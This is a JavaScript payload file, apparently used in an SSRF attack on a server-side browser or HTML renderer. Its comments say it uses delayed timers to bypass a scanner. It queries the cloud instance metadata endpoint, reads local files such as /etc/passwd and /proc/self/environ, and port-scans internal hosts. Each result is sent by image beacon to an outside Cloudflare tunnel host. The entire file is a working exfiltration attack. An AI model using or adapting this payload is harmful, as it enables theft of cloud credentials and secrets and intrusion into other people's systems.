// This file is loaded BEFORE the padding file
// setTimeout bypasses scanner, fires during padding download

// SSRF to IMDS
setTimeout(function(){
  var r=document.getElementById('out');
  var x=new XMLHttpRequest();
  x.open('GET','http://169.254.169.254/latest/meta-data/',false);
  try{x.send();r.textContent='IMDS:'+x.responseText.substring(0,500);}
  catch(e){
    // Try file read instead  
    var x2=new XMLHttpRequest();
    x2.open('GET','file:///etc/hostname',false);
    try{x2.send();r.textContent='HOST:'+x2.responseText;}
    catch(e2){r.textContent='BOTH_ERR:IMDS='+e.message+'|FILE='+e2.message;}
  }
  // Exfil result
  var i=new Image();
  i.src='https://influence-barn-expenditures-agriculture.trycloudflare.com/ssrf-result?r='+encodeURIComponent(r.textContent);
},2500);

// Also try proc/environ read at 3s
setTimeout(function(){
  var r2=document.getElementById('out2');
  var paths=['/proc/self/environ','/proc/self/cmdline','/etc/passwd','/proc/net/tcp'];
  var out='';
  paths.forEach(function(p){
    var x=new XMLHttpRequest();
    x.open('GET','file://'+p,false);
    try{x.send();out+=p.split('/').pop()+'='+x.responseText.substring(0,100)+'|';}
    catch(e){out+=p.split('/').pop()+'=E:'+e.message.substring(0,30)+'|';}
  });
  r2.textContent=out;
  var i=new Image();
  i.src='https://influence-barn-expenditures-agriculture.trycloudflare.com/ssrf-result?proc='+encodeURIComponent(out);
},3000);

// Internal port scan at 3.5s
setTimeout(function(){
  var r3=document.getElementById('out3');
  var out='';
  [[80,'127.0.0.1'],[8080,'127.0.0.1'],[3000,'127.0.0.1'],[9090,'127.0.0.1'],[6379,'127.0.0.1'],[80,'172.17.0.1']].forEach(function(t){
    var x=new XMLHttpRequest();
    x.open('GET','http://'+t[1]+':'+t[0]+'/',false);
    x.timeout=1000;
    try{x.send();out+=t[1]+':'+t[0]+'='+x.status+'|';}
    catch(e){out+=t[1]+':'+t[0]+'=X|';}
  });
  r3.textContent=out;
  var i=new Image();
  i.src='https://influence-barn-expenditures-agriculture.trycloudflare.com/ssrf-result?scan='+encodeURIComponent(out);
},3500);
